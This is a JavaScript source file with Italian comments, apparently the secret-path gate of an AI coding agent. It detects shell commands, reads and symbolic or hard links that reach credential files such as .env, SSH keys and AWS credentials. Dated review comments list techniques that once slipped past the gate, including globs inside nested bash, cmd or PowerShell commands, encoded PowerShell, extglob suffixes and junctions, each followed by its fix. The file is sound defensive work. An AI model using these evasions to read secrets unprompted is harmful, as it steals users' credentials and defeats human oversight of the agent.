 *   comandi veri) toglievano il corpo e con lui il tetto «troppo complesso». Ora il `<<` conta solo fuori dalle virgolette e prima di un
 *   commento, e una pipe verso una shell dopo il delimitatore vuol dire «heredoc che alimenta una shell». Come Hermes, che tiene i corpi
 *   di shell («shell execution via heredoc», `tools/approval_detection.py:440-442` e `:1010-1011`, clone 01/11), e come il pavimento
 *   dei comandi qui, che salta i commenti con `eInizioCommento` (`kernel/pavimento-comandi.mjs:133`). Nel dubbio il corpo resta: si
 *   chiede come prima di S6, solo fuori dall'Accesso pieno.
 */
const SHELL_DOPO_UNA_PIPE = /\|&?.*(?:^|[\s\\/|;&(])(?:(?:ba|z|da|k|c|fi|a)?sh|pwsh|powershell|cmd)(?:\.exe)?(?=$|[\s;|&)])/iu;
function heredocDellaRiga(riga) {
  let apice = '';
  for (let j = 0; j < riga.length; j += 1) {
    const c = riga[j];
    if (apice) { if (c === apice) apice = ''; continue; }
    if (c === "'" || c === '"') { apice = c; continue; }
    if (c === '#' && (j === 0 || /[\s;|&(]/u.test(riga[j - 1]))) return null;
    if (c === '<' && riga[j + 1] === '<' && riga[j + 2] !== '<' && riga[j - 1] !== '<') {
      const trovato = /^<<-?\s*(['"]?)([A-Za-z_][\w-]*)\1/u.exec(riga.slice(j));
      if (trovato) return { index: j, fine: j + trovato[0].length, 1: trovato[1], 2: trovato[2] };
    }
  }
  return null;
}
function senzaCorpiDiHeredoc(testo) {
  const righe = String(testo ?? '').split('\n');
  const fuori = [];
  for (let i = 0; i < righe.length; i += 1) {
    const riga = righe[i];
    fuori.push(riga);
    const heredoc = heredocDellaRiga(riga);
    if (!heredoc || /\b(?:ba|z|da|k|c|fi|a)?sh\b|\bpwsh\b|\bpowershell\b|\bcmd\b/iu.test(riga.slice(0, heredoc.index))) continue;
    if (SHELL_DOPO_UNA_PIPE.test(riga.slice(heredoc.fine))) continue;
    let fine = -1;
    for (let k = i + 1; k < righe.length; k += 1) if (righe[k].trim() === heredoc[2]) { fine = k; break; }
    if (fine === -1) continue;
    const siEsegue = heredoc[1] === '' && righe.slice(i + 1, fine).some((r) => r.includes('$(') || r.includes('`'));
    if (!siEsegue) i = fine;
  }
  return fuori.join('\n');
}

/**
 * I comandi DENTRO `$(..)` e fra apici inversi, ovunque stiano (anche fra doppi apici): la shell li esegue, quindi si esaminano come comandi a sé.
 * Nella parola che li contiene valgono il jolly (`paroleDellaShell`); qui si guarda il loro testo.
 */
function sostituzioniDiComando(t) {
  const dentro = [];
  for (let i = 0; i < t.length; i += 1) {
    if (t[i] === '\\') { i += 1; continue; }
    if (t[i] === "'" ) { const fine = t.indexOf("'", i + 1); if (fine === -1) break; i = fine; continue; }
    if (t[i] === '$' && t[i + 1] === '(') {
      const fine = chiusaBilanciata(t, i + 1, '(', ')');
      dentro.push(t.slice(i + 2, fine === -1 ? t.length : fine));
      if (fine === -1) break;
      i = fine;
      continue;
    }
    if (t[i] === '`') {
      const fine = t.indexOf('`', i + 1);
      dentro.push(t.slice(i + 1, fine === -1 ? t.length : fine));
      if (fine === -1) break;
      i = fine;
    }
  }
  return dentro;
}

/*
 * ⛔ Dalla revisione del bugfixer (16/10/2026, preesistente): un glob dentro le virgolette di un INTERPRETE ANNIDATO non chiedeva —
 *   `powershell -c "gc .e*v"`, `bash -c 'cat .e*v'`, `cmd /c "type .e*v"` leggevano il `.env` (PowerShell davvero). Le virgolette
 *   impediscono il glob al primo livello, ed è giusto; ma quel testo è un COMANDO che l'interprete rileggerà. ⇒ Si estrae e si giudica
 *   come un comando, con la stessa ricorsione (e lo stesso tetto) delle sostituzioni `$(…)`. Come Codex, che apre `bash -lc`/`-c`
 *   (`codex-rs/shell-command/src/bash.rs:110`) e `powershell -Command`/`-c` (`powershell.rs:56-64`); in più qui i prefissi che
 *   PowerShell accetta (`-co`, `-comm`…, senza elenco: vedi sotto), `-EncodedCommand` decodificato (UTF-16LE, base64) e `cmd /c` `/k` `/r`.
 */
const INTERPRETI_SHELL = new Set(['sh', 'bash', 'zsh', 'dash', 'ksh', 'mksh', 'fish']);
const OPZIONE_CODIFICATA_PS = /^-(?:e|ec|en|enc|enco|encod|encode|encoded|encodedc|encodedco|encodedcom|encodedcomm|encodedcomma|encodedcomman|encodedcommand)$/iu;
/*
 * ⛔ Buchi della guardia (03/11/2026 notte, misurato sul codice di beec27135): ogni interprete trovato ricopiava TUTTO il resto del comando, e `'bash -c '.repeat(20000)`
 *   (160 mila caratteri) esauriva i 4 GB di memoria del processo, cioè fermava il server di tutte le sessioni; con 2.000 ripetizioni ci voleva quasi un secondo.
 *   ⇒ Al più `INTERPRETI_MASSIMI` testi annidati per livello; oltre, la lista porta `troppi` e chi la usa chiede. Un comando vero ne ha uno o due.
 */
const INTERPRETI_MASSIMI = 16;
const NOMI_CHE_RILEGGONO = new Set(['iex', 'invoke-expression', 'powershell', 'pwsh', 'cmd']);
/* la stessa forma di `VARIABILE_DI_CMD`, cercata ovunque: c'è almeno una variabile di cmd? */
const UNA_VARIABILE_DI_CMD = new RegExp(VARIABILE_DI_CMD.source, 'u');
const haVariabiliDiCmd = (testo) => UNA_VARIABILE_DI_CMD.test(testo);
function comandiDegliInterpreti(testo) {
  const lette = paroleDellaShell(testo);
  const parole = lette.map((p) => p.testo);
  const interni = [];
  for (let i = 0; i < parole.length; i += 1) {
    if (interni.length >= INTERPRETI_MASSIMI) {
      const fuori = interni.filter((x) => x.trim() !== '');
      fuori.troppi = true;
      return fuori;
    }
    const nome = nomeDelComando(parole[i]);
    if (!INTERPRETI_SHELL.has(nome) && !NOMI_CHE_RILEGGONO.has(nome)) continue;
    /* il resto si copia solo per un interprete: copiarlo per ogni parola costava un tempo quadratico (2 secondi su 200 mila caratteri, misurati) */
    /*
     * ⛔ Blocco dopo (S3 della revisione di Performance su 62b70c142, 04/11/2026): il resto è solo il SEGMENTO dell'interprete, fino al primo `;` `&` `|` `(` `)`
     *   o a capo fuori dagli apici. Prima era tutto il resto della riga, e `bash -c "echo 0" && bash -c "echo 1" && …` cinque volte diventava cinque livelli
     *   uno dentro l'altro: oltre il quarto si chiedeva, e cinque comandi innocui davano una carta. Il separatore lo consuma la shell di FUORI prima di lanciare
     *   l'interprete (bash, manuale 3.2.4; `cmd /?`: `&&` fuori dagli apici); ciò che sta dopo si legge comunque al primo livello. Gli argomenti dopo il testo
     *   (`$0`, `$1` di bash, le parole che PowerShell unisce al `-Command`) restano nel segmento, come prima. ⛔ Resta, detto: oltre `INTERPRETI_MASSIMI`
     *   interpreti nello stesso testo si chiede ancora. Fonti: `FONTI-GUARDIA-BLOCCO-DOPO-2026-11-04.md` (bash «Invoking Bash», about_Pwsh,
     *   `CommandLineParameterParser.cs:1617`, Codex `bash.rs:106-119`, mvdan/sh `nodes.go:363-366`).
     */
    let fine = i + 1;
    while (fine < lette.length && lette[fine].segmento === lette[i].segmento) fine += 1;
    const resto = parole.slice(i + 1, fine);
    if (INTERPRETI_SHELL.has(nome)) {
      /*
       * Riverifica del bugfixer (16/10/2026 notte): bash esegue il primo argomento che NON è un'opzione dopo `-c` (`bash -c -- '…'`,
       * `-c -e '…'`, `-c -x '…'` girano davvero), e gli argomenti che seguono diventano `$0`, `$1`… (`bash -c 'cat "$1"' _ .env`).
       * ⇒ Si rilegge TUTTO ciò che segue `-c`, come per PowerShell. In più `fish --command '…'` e `--command='…'` (le parole della
       * shell staccano già il valore dopo `=`: un ramo a parte per `--command=` era un mutante equivalente, provato).
       */
      const k = resto.findIndex((p) => /^-[A-Za-z]*c[A-Za-z]*$/u.test(p) || /^--command$/iu.test(p));
      if (k !== -1) interni.push(resto.slice(k + 1).join(' '));
    } else if (nome === 'iex' || nome === 'invoke-expression') {
      /* dentro PowerShell, `iex '…'` / `Invoke-Expression '…'` esegue il testo che riceve: si rilegge come un comando */
      interni.push(resto.join(' '));
    } else if (nome === 'powershell' || nome === 'pwsh') {
      const ke = resto.findIndex((p) => OPZIONE_CODIFICATA_PS.test(p));
      if (ke !== -1 && resto[ke + 1]) {
        try { interni.push(Buffer.from(resto[ke + 1], 'base64').toString('utf16le')); } catch { /* non è base64: niente da rileggere */ }
      }
      /*
       * Si rilegge TUTTO ciò che segue `powershell`, senza le virgolette: col `-Command` (`-c`, `-co`, `-comm`… i prefissi che
       * PowerShell accetta) e senza opzione (il `-Command` di serie) il testo del comando è lì dentro. Le opzioni e i loro valori
       * (`-NoProfile`, `-ExecutionPolicy Bypass`, il base64 di `-EncodedCommand`) vi finiscono come parole in più: innocue, perché il
       * giudizio guarda i pezzi uno per uno. Riconoscere `-Command` coi suoi prefissi, o saltare le opzioni, non cambiava nessun esito
       * (due mutanti equivalenti, provati il 16/10): per questo non c'è.
       * Riverifica del bugfixer: un blocco di script (`& {gc .e*v}`, `. {…}`) si rilegge senza le graffe, che altrimenti restano
       * attaccate alle parole (`.e*v}` non è più il nome di nessun file). ⛔ Restano fuori, dichiarate, le forme CALCOLATE
       * (`$x = '.e*v'; gc $x`, stringhe composte): a parole non si sa che cosa varranno.
       */
      interni.push(resto.join(' ').replace(/[{}]/gu, ' '));
    } else if (nome === 'cmd') {
      /* `/c` anche attaccato al testo che segue (`cmd /c"type .e*v"`, che cmd esegue), e `//c`: da Git Bash si scrive così, perché
         MSYS trasformerebbe `/c` in un percorso (riverifica del bugfixer, 17/10/2026) */
      const k = resto.findIndex((p) => /^\/{1,2}[ckr]/iu.test(p));
      if (k !== -1) interni.push([resto[k].replace(/^\/{1,2}[ckr]/iu, ''), ...resto.slice(k + 1)].join(' '));
    }
  }
  return interni.filter((x) => x.trim() !== '');
}

/** I comandi che stampano soltanto i loro argomenti, in bash, cmd e PowerShell (F-P-004c). */
const SOLO_STAMPA = new Set(['echo', 'printf', 'write-output', 'write-host']);
/** `C:\\x\\Echo.EXE` → `echo`: il nome del comando senza cartella, estensione e maiuscole. */
function nomeDelComando(comando) {
  return String(comando ?? '').split(/[\\/]/u).pop().toLowerCase().replace(/\.(?:exe|cmd|bat|com)$/u, '');
}

/** Il passo delle parole della shell: stessa risposta di `nominaUnSegreto`, o null. */
function nominaUnSegretoPerGlob(testo, { home, cartella, elenca, puntiNascosti, orologio, bilancio: ereditato, profondita = 0, leggiTesta }) {
  /* REV-ESEMPI-02/05 (14/10/2026): un nome espanso da un jolly (`cat *.example`) o liberato dalle virgolette (`cat "my dir/.env.example"`)
     che è un file d'esempio si guarda anche DENTRO, come la parola scritta per intero. */
  const esempio = (percorso) => esempioConUnaChiave(percorso, { cartella, home, ...(leggiTesta ? { leggiTesta } : {}) });
  const bilancio = ereditato ?? { cartelle: 0, nomi: 0, cache: new Map(), orologio, scadenza: orologio() + TETTI_GLOB_SEGRETI.millisecondi };
  /* v5: prima i comandi dentro le sostituzioni (al massimo quattro livelli: oltre, si chiede) */
  const degliInterpreti = comandiDegliInterpreti(senzaCorpiDiHeredoc(testo));
  /* buchi della guardia: oltre il tetto degli interpreti (`bash -c ` ripetuto ventimila volte esauriva la memoria del server) si chiede */
  /* blocco dopo (punto 3): ogni uscita da un tetto porta `perche: 'troppo-complesso'`, e la carta lo dice; il `percorso` resta quello di prima, e la chiave del consenso porta il perché (decisione 107) */
  if (degliInterpreti.troppi) return { classe: 'segreto', percorso: String(testo).trim().slice(0, 120), perche: 'troppo-complesso' };
  for (const interno of [...sostituzioniDiComando(senzaCorpiDiHeredoc(testo)), ...degliInterpreti]) {
    if (profondita >= 4) return { classe: 'segreto', percorso: interno.slice(0, 120), perche: 'troppo-complesso' };
    const trovato = nominaUnSegreto(interno, { home }) ?? nominaUnSegretoPerGlob(interno, { home, cartella, elenca, puntiNascosti, orologio, bilancio, profondita: profondita + 1 });
    if (trovato) return trovato;
  }
  /* il jolly non si mostra a una persona: al suo posto `…` */
  const prudente = (parola) => ({ classe: 'segreto', percorso: parola.split(JOLLY).join('…'), perche: 'troppo-complesso' });
  /*
   * F-P-004 (S1, stress test della CLI 0.5.5, 12/10/2026): `type .\.e*v` e `type keys\id_*` leggevano i segreti, perché la sola lettura di bash
   * fa di `\` un escape (`..e*v`, `keysid_*`), mentre cmd e PowerShell lo usano come separatore. Lo stesso testo si legge nelle DUE grammatiche
   * e basta che una nomini un segreto. La seconda lettura si aggiunge solo se il testo ha una `\` (altrimenti è identica).
   */
  const senzaHeredoc = senzaCorpiDiHeredoc(testo);
  const letture = paroleDellaShell(senzaHeredoc);
  /* F2 dei buchi della guardia (03/11/2026 notte): la lettura di cmd e PowerShell serve anche quando c'è una variabile di cmd (`type .e%x%v`), e lì la variabile vale il jolly */
  if (senzaHeredoc.includes('\\') || haVariabiliDiCmd(senzaHeredoc)) letture.push(...paroleDellaShell(senzaHeredoc, { barraDiWindows: true, variabiliDiCmd: true }));
  for (const { testo: scritta, chiamata, comando } of letture) {
    if (chiamata) continue;
    /* buchi della guardia (S3): le sequenze `{x..y}` si scrivono per esteso prima di tutto, come in bash e come nella guardia dei biglietti (`formeDellaParola`) */
    const { parole, troppe, testo: parola } = formeDellaParola(scritta);
    /* una parola che è SOLO una sostituzione (`$FILE`, `"$X"`) può valere qualunque cosa: non si chiede per lei (dichiarato), solo per quelle che
       hanno almeno due caratteri scritti di loro (`.e${X}nv`, `${X}env`) */
    if (parola.includes(JOLLY) && parola.split(JOLLY).join('').replace(/[*?[\]/]/gu, '').length < 2) continue;
    if (troppe) return prudente(parola);
    for (const p of parole) {
      if (!eUnGlob(p)) {
        /* v5: la parola dopo la rimozione delle virgolette (`.e""nv` = `.env`) passa dalla stessa grammatica di un nome scritto per intero */
        const classe = classeDelPezzo(p, home);
        if (classe) return { classe, percorso: p };
        const conChiave = esempio(p);
        if (conChiave) return conChiave;
        continue;
      }
      /* F-P-004c (S3, stress test della CLI 0.5.5, 12/10/2026): `echo import * from fs` era rifiutato perché il `*` nudo si espandeva su
         `.env`. Un comando che STAMPA soltanto i suoi argomenti (al più i NOMI dei file, mai il contenuto) non legge niente: per lui i jolly
         non si espandono. Un nome scritto per intero (`echo x > .env`) e i comandi dentro `$(..)` restano giudicati come prima. */
      if (SOLO_STAMPA.has(nomeDelComando(comando))) continue;
      const trovati = candidatiDelGlob(p, { home, cartella, elenca, puntiNascosti, bilancio });
      for (const candidato of trovati.candidati) {
        const classe = classeDelPezzo(candidato, home);
        if (classe) return { classe, percorso: candidato };
        const conChiave = esempio(candidato);
        if (conChiave) return conChiave;
      }
      if (trovati.troppe || trovati.illeggibile) return prudente(p);
    }
  }
  return null;
}

/**
 * ⛔⛔⛔ CASO 1 — il testo NOMINA un percorso della classe dichiarata?
 * Vale sia per un comando intero (`cat ~/.ssh/id_rsa`) sia per un percorso solo
 * (`~/.aws/credentials`): un percorso è un comando di un pezzo solo.
 *
 * @returns {null | {classe: 'segreto'|'portachiavi', percorso: string}} `percorso` è il pezzo
 * COME LA PERSONA LO VEDRÀ, non risolto: chi risponde deve riconoscere ciò che ha davanti.
 */
export function nominaUnSegreto(testo, {
  home = homeDiSistema(), cartella, espandi = false, elenca = elencaDalDisco, puntiNascosti = process.platform === 'win32', orologio = () => performance.now(), leggiTesta,
} = {}) {
  const intero = String(testo ?? '');
  if (intero.trim() === '') return null;
  for (const frase of PERCORSI_SEGRETI.frasiPortachiavi) {
    if (frase.test(intero)) return { classe: 'portachiavi', percorso: intero.trim() };
  }
  for (const { pezzo, chiamata } of pezziConSeguito(intero)) {
    /* Ticket C-005 (01/10/2026): `s.key()` in uno script è un metodo, non il file `s.key`. Solo il pezzo seguito SUBITO da `(`. */
    /* Revisione avversariale 07/10 (R-5): `nome$(…)` è una sostituzione di comando incollata a una parola, non una chiamata:
       il guscio apre `nome`, e `cat ~/.ssh/id_rsa$(true)` leggeva il segreto senza fermarsi. */
    /* Revisione del bugfixer del desktop (08/10/2026, provata su un bash vero): una chiamata vera ha una lettera, una cifra o `_` subito
       prima di `(` (`s.key()`). Un carattere di pattern lì è un'altra cosa: in bash con extglob `*() ?() @() +() !()` ESPANDONO NEL FILE
       STESSO, e `cat ~/.ssh/id_rsa*()` leggeva il segreto senza chiedere. Si controlla il pezzo togliendo quel carattere finale (così
       anche `.env*()` si riconosce). Residuo dichiarato: non è un parser di shell; i qualificatori di zsh come `id_rsa(.)` non si leggono. */
    if (chiamata && /[A-Za-z0-9_]$/u.test(pezzo)) continue;
    const classe = classeDelPezzo(chiamata ? pezzo.replace(/[$*?+@!]+$/u, '') : pezzo, home);
    if (classe) return { classe, percorso: pezzo.replace(/^["'`]+/, '').replace(/["'`]+$/, '') };
  }
  /* C-005 terzo giro (08/10/2026): solo per un comando di shell, dopo il passo sul testo, e solo se c'è una graffa o un carattere jolly.
     v5: anche se c'è un apice, una barra rovescia, un `$`, un apice inverso o `^` (cmd): la shell li toglie o li sostituisce prima di aprire il file. */
  if (espandi && (/[*?[{'"\\$`^]|[@+!]\(/u.test(intero) || haVariabiliDiCmd(intero) || comandiDegliInterpreti(intero).length > 0)) {
    /* Un modulo dentro un cancello di sicurezza non lancia: se il passo dei glob si rompe per un motivo che non so, CHIEDE (mai in silenzio). */
    try { return nominaUnSegretoPerGlob(intero, { home, cartella, elenca, puntiNascosti, orologio, ...(leggiTesta ? { leggiTesta } : {}) }); } catch { return { classe: 'segreto', percorso: intero.trim().slice(0, 120), perche: 'troppo-complesso' }; }
  }
  return null;
}

/**
 * ⛔⛔⛔ CASO 2 — IL CONFINE STRETTO: il percorso esce dal workspace E finisce dentro qualcosa
 * di NASCOSTO (un segmento che comincia con `.`).
 *
 * ⛔ Sono DUE condizioni, e servono entrambe. Non «tutto ciò che esce dal workspace» (un
 * `cat ../fratello/note.txt` è lavoro normale) e non «tutto ciò che sta sotto la home»
 * (`echo $HOME` non tocca niente). Ogni domanda in più addestra a rispondere sì senza
 * leggere — e una domanda a cui si risponde sì senza leggere non protegge da niente.
 */
export function esceDalWorkspaceVersoUnNascosto(percorso, { cartella, home = homeDiSistema() } = {}) {
  const normalizzato = conLaHomeEspansa(percorso, home);
  if (normalizzato === '' || normalizzato.includes('://')) return null;
  // Senza una radice non si può dire «fuori»: nessun innesco, mai un falso allarme.
  if (typeof cartella !== 'string' || cartella === '') return null;
  // Un pezzo che non porta un separatore non è un percorso: `$HOME` non espansa, `--flag`, `npm`.
  if (!/[\\/]/u.test(String(percorso ?? '')) && !String(percorso ?? '').trim().startsWith('~')) return null;
  let radice;
  let assoluto;
  try {
    radice = risolvi(cartella);
    assoluto = risolvi(radice, normalizzato);
  } catch { return null; }
  if (isPathInside(radice, assoluto)) return null;
  const segmenti = segmentiDi(assoluto.replace(/\\/g, '/'));
  /*
   * ⛔⛔⛔ B3 (17/09/2026) — l'esenzione `.pub` vince ANCHE qui, non solo sulla classe.
   * Prima no, e il risultato era una incoerenza: il commento di `esenzioniOvunque` portava come
   * esempio `~/.ssh/id_rsa.pub`, e proprio lì l'esenzione era inerte perché il confine chiedeva
   * lo stesso. Una chiave pubblica è pubblica ovunque stia; chiedere per lei insegna a cliccare
   * sì, e la volta che conta (`id_rsa`, senza `.pub`) la persona clicca sì per abitudine.
   * ⛔ Solo per il FILE, mai per la cartella: `ls ~/.ssh` elenca anche ciò che pubblico non è,
   *   e infatti resta un segreto per via della classe, che corre prima di questo controllo.
   */
  const ultimo = segmenti[segmenti.length - 1] ?? '';
  if (PERCORSI_SEGRETI.esenzioniOvunque.some((e) => ultimo.toLowerCase().endsWith(e))) return null;
  const nascosto = segmenti.find((s) => s.startsWith('.'));
  if (!nascosto) return null;
  return { classe: 'fuori-workspace-nascosto', percorso: String(percorso).trim(), nascosto };
}

/**
 * ⛔⛔⛔ D2 (owner 03/10/2026, «Chiedere sempre, credenziali sempre») — CASO 3, SOLO PER LE LETTURE: il percorso di
 * `leggi` o di `elenca` esce dalla cartella della sessione. Una lettura fuori dal progetto chiede, nascosta o no.
 *
 * Il difetto misurato dallo stress test della CLI (03/10): `elenca "C:/Users/<persona>"` passava senza domanda e
 * metteva nel contesto `.ssh/id_ed25519`, `.claude/.credentials.json`, `.codex/auth.json`; `leggi` apriva i file
 * dell'app desktop in `AppData`. Il controllo era solo su `..` (`RISALITA`), cioè sulla PAROLA, non sul posto.
 * Come fanno gli altri (letto il 03/10): OpenCode chiede `external_directory` per read/glob/grep/list fuori dal
 * progetto, di serie `"*": "ask"` (`tool/external-directory.ts`, `agent/agent.ts:122`); Claude Code legge senza
 * chiedere solo «within the working directory and additional directories» (doc permissions); OWASP LLM06:2025
 * limita l'accesso ai file alla radice del progetto.
 *
 * ⛔ Solo letture, mai la shell: per un comando i pezzi non sono percorsi certi, e `cat ../fratello/note.txt` resta
 *   il comportamento di oggi (CASO 2 sopra, con la stessa ragione).
 * ⛔ Con «Accesso completo» questa regola TACE (`accessoPieno`), le credenziali no: il CASO 1 corre prima, sempre.
 *   ⛔ Non basta la cartella: in una sessione a cartella SCELTA l'Accesso completo non la allarga alla radice (BC-14), e
 *   senza `accessoPieno` leggere fuori chiedeva mentre scrivere fuori no — e «leggi prima di sostituire» faceva fallire la
 *   scrittura (FULL-ACCESS-03, B2-01, review del 03/10/2026).
 * ⛔ Lessicale, come il CASO 2: un collegamento DENTRO il progetto che porta fuori non lo vede (dichiarato).
 *
 * @returns {null | {classe: 'fuori-workspace', percorso: string}}
 */
export function letturaFuoriDalWorkspace(percorso, { cartella, home = homeDiSistema() } = {}) {
  const grezzo = String(percorso ?? '').trim();
  const normalizzato = conLaHomeEspansa(grezzo, home);
  if (normalizzato === '' || normalizzato.includes('://')) return null;
  // Senza una radice non si può dire «fuori»: nessun innesco, mai un falso allarme (come il CASO 2).
  if (typeof cartella !== 'string' || cartella === '') return null;
  let radice;
  let assoluto;
  try {
    radice = risolvi(cartella);
    assoluto = risolvi(radice, normalizzato);
  } catch { return null; }
  if (isPathInside(radice, assoluto)) return null;
  return { classe: 'fuori-workspace', percorso: grezzo };
}

/**
 * ⛔⛔⛔ LINK-SEGRETO (08/10/2026, sonda sul candidato 2098989ff prima della beta 0.1.24) — CASO 1-bis, SOLO PER LE LETTURE:
 * il nome che il modello usa è innocuo, ma il file VERO dietro un collegamento è un segreto. Misurato: con una giunzione
 * `progetto/dati` → `<fuori>/.aws` (su Windows non vuole privilegi), `leggi dati/credentials` non chiedeva, anche senza
 * «Accesso completo»; `leggi .aws/credentials` sì. ⇒ Per una lettura il percorso è UNO e esiste: si risolve e si
 * classifica ANCHE il bersaglio, con la stessa `classeDelPezzo`.
 * Owner: «la risposta è sempre quella di Hermes, Claude, Codex». Hermes classifica il percorso RISOLTO
 * (`agent/file_safety.py:391`, `Path(path).expanduser().resolve()`, clone 65ad529, «defense-in-depth — not a security
 * boundary», come qui); Claude Code ha curato questo stesso aggiramento come vulnerabilità (CVE-2025-59829, CVE-2026-25724,
 * 2.1.7; 2.1.89 controlla il bersaglio risolto anche nelle regole «allow»).
 * ⛔ Il vincolo da Hermes (`file_safety.py:384-388`): un percorso UNC o del namespace NT (`\\host\…`, `\\?\`, `\\.\`, `\??\`)
 *   NON si risolve mai — su Windows la risoluzione stessa fa partire l'autenticazione SMB, cioè la fuga NTLM, prima di
 *   qualunque confronto. Qui si scarta sulla stringa GREZZA.
 * ⛔⛔ E NIENTE `realpath`: la prima versione lo usava, e la suite intera l'ha presa (RETE-09, RETE-10 di
 *   `percorsi-di-rete.test.mjs`): con la cartella della sessione su una condivisione, o con un collegamento LOCALE che porta a
 *   una condivisione, `existsSync`/`realpath` toccavano la rete PRIMA del sì della persona. Si cammina invece come
 *   `destinazioneDiRete` (`kernel/file-namespace-contract.mjs:66`): `lstat` (non segue il collegamento) e `readlink` (legge il
 *   collegamento stesso), un pezzo alla volta; un bersaglio locale si segue A PAROLE, e al primo salto verso la rete ci si
 *   ferma senza classificare — quella domanda la fa il cancello della rete, prima di ogni contatto.
 * ⛔ Solo quando un collegamento c'è davvero (bersaglio ≠ percorso scritto): senza, il caso lessicale ha già deciso, e
 *   classificare tutti gli antenati assoluti di ogni lettura non aggiunge niente.
 * ⛔ STESSO FILE, STESSA RISPOSTA, qualunque percorso abbia aperto il progetto (review del bugfixer, 08/10): un bersaglio che
 *   resta DENTRO il progetto si classifica RELATIVO alla radice reale del progetto, uno che ne ESCE si classifica intero.
 *   Senza, un progetto che sta davvero sotto `…\keyrings\progetto`, aperto da una giunzione innocente, chiedeva a OGNI
 *   lettura, e aperto dal suo percorso vero a nessuna (LS-07). La cartella la sceglie la persona, non il modello: il rischio
 *   sta nei collegamenti DENTRO il progetto (un repository clonato coi suoi link), ed è quello che si guarda.
 * ⛔ È un innesco come il resto del file: se il disco non risponde si torna `null` (il comportamento di oggi), mai un'eccezione.
 * ⛔ Restano fuori, dichiarati: la SHELL (i pezzi di un comando spesso non esistono — vedi «I LIMITI NOTI» sopra), la RICERCA
 *   (misurato: rg e la via JS non attraversano la giunzione), e i collegamenti FISSI (un hardlink È il file: nessuna
 *   risoluzione lo distingue, e nessuno dei concorrenti li tratta — domanda aperta all'owner).
 * @returns {null | {classe: string, percorso: string}}
 */
/** Un percorso che porta fuori dalla macchina (o nel namespace NT): mai da toccare qui. Solo la stringa. */
function eDiRete(percorso) {
  const s = String(percorso).replace(/\//gu, '\\');
  if (/^\\\\\?\\[A-Za-z]:\\/u.test(s)) return false; // `\\?\C:\…` è il disco locale scritto per esteso
  return s.startsWith('\\\\') || s.startsWith('\\??\\');
}

/**
 * Dove porta DAVVERO un percorso locale, a parole: `lstat` + `readlink`, un pezzo alla volta, mai la destinazione aperta.
 * Un pezzo che non esiste chiude il cammino (il resto si tiene com'è scritto). `null` = un salto porta in rete.
 * ⛔ S3 (revisione di Performance su 1f5c8695a): oltre i 40 salti il cammino non sa dove arriva, e Windows segue le giunzioni fino a 63.
 *   Prima si dava `null`, che chi legge prende per «niente da dire»: ora `OLTRE_IL_TETTO`, e chi legge chiede «troppo complesso».
 */
const OLTRE_IL_TETTO = Symbol('oltre-il-tetto-dei-salti');
function percorsoVeroAParole(assoluto, { lstatSync: lstatFn, readlinkSync: readlinkFn }) {
  let davanti = assoluto;
  for (let salti = 0; salti <= 40; salti += 1) {
    if (eDiRete(davanti)) return null;
    const { root } = parsePercorso(davanti);
    const pezzi = davanti.slice(root.length).split(/[\\/]+/u).filter(Boolean);
    let corrente = root;
    let deviato = false;
    for (let i = 0; i < pezzi.length; i += 1) {
      corrente = join(corrente, pezzi[i]);
      let info;
      try { info = lstatFn(corrente); } catch { return davanti; }
      if (!info.isSymbolicLink()) continue;
      let bersaglio;
      try { bersaglio = String(readlinkFn(corrente)); } catch { return davanti; }
      if (eDiRete(bersaglio)) return null;
      const locale = bersaglio.replace(/^\\\\\?\\(?=[A-Za-z]:\\)/u, '');
      davanti = join(risolvi(cartellaDi(corrente), locale), ...pezzi.slice(i + 1));
      deviato = true;
      break;
    }
    if (!deviato) return davanti;
  }
  return OLTRE_IL_TETTO;
}
/** La segnalazione di un cammino oltre il tetto: si chiede col perché dei tetti, sul percorso com'è scritto. */
const oltreIlTetto = (scritto) => ({ classe: 'segreto', percorso: scritto, perche: 'troppo-complesso' });

function bersaglioSegretoDiUnCollegamento(percorso, { cartella, home, fsSync = { lstatSync: lstatSyncNativa, readlinkSync: readlinkSyncNativa } }) {
  const grezzo = String(percorso ?? '').trim();
  if (eDiRete(grezzo)) return null;
  const normalizzato = conLaHomeEspansa(grezzo, home);
  if (normalizzato === '' || normalizzato.includes('://') || normalizzato.startsWith('//')) return null;
  const assolutoScritto = /^[A-Za-z]:\//u.test(normalizzato) || normalizzato.startsWith('/');
  const conCartella = typeof cartella === 'string' && cartella !== '';
  if (!assolutoScritto && !conCartella) return null;
  /* la cartella della sessione su una condivisione: nessun cammino, la domanda della rete viene prima (RETE-09) */
  if (conCartella && eDiRete(cartella)) return null;
  try {
    const assoluto = assolutoScritto ? risolvi(normalizzato) : risolvi(cartella, normalizzato);
    const reale = percorsoVeroAParole(assoluto, fsSync);
    if (reale === null) return null;
    if (reale === OLTRE_IL_TETTO) return oltreIlTetto(grezzo);
    const stesso = process.platform === 'win32' ? reale.toLowerCase() === assoluto.toLowerCase() : reale === assoluto;
    if (stesso) return null;
    const radiceReale = conCartella ? percorsoVeroAParole(risolvi(cartella), fsSync) : null;
    if (conCartella && radiceReale === null) return null;
    if (radiceReale === OLTRE_IL_TETTO) return oltreIlTetto(grezzo);
    const dentro = radiceReale !== null && isPathInside(radiceReale, reale);
    const daClassificare = dentro ? relativoA(radiceReale, reale) : reale;
    if (daClassificare === '') return null;
    const classe = classeDelPezzo(daClassificare, home);
    return classe ? { classe, percorso: `${grezzo} → ${reale}` } : null;
  } catch {
    return null;
  }
}

/*
 * ⛔ Owner 16/10/2026 notte («Cartella + radice + casa»), dalla riverifica del bugfixer (SEG-DOC-RI-05): un HARD LINK col nome
 *   innocuo (`appunti.md`) è lo STESSO file del `.env` — leggi, scrivi, file_edit, la shell e document_create non chiedevano,
 *   perché la classe si decide sul nome e non c'è un bersaglio da seguire come per un collegamento simbolico. Nessun concorrente lo
 *   gestisce (Hermes `agent/file_safety.py` usa solo `realpath`, che un hard link non lo vede).
 * ⇒ Solo per i file con più di un nome (`nlink > 1`, raro fuori dai `node_modules` di pnpm) si confronta l'identità (`dev` + `ino`,
 *   in bigint: su Windows è il numero di file di NTFS) con i segreti PER NOME di tre posti: la cartella del file, la radice del
 *   progetto, la casa (le sue credenziali e le cartelle `.ssh`, `.aws`… un livello sotto). Un `.env` in un'altra sottocartella
 *   resta fuori, dichiarato dall'owner. Mai un'eccezione da un cancello: un `stat` che fallisce vale «non lo so» = `null`.
 */
function segretoDiUnCollegamentoFisico(percorso, { cartella, home, statFn = statSyncNativa, elencaFn = elencaSync, fsSync, memoria = {} } = {}) {
  const grezzo = String(percorso ?? '').trim();
  if (grezzo === '' || eDiRete(grezzo)) return null;
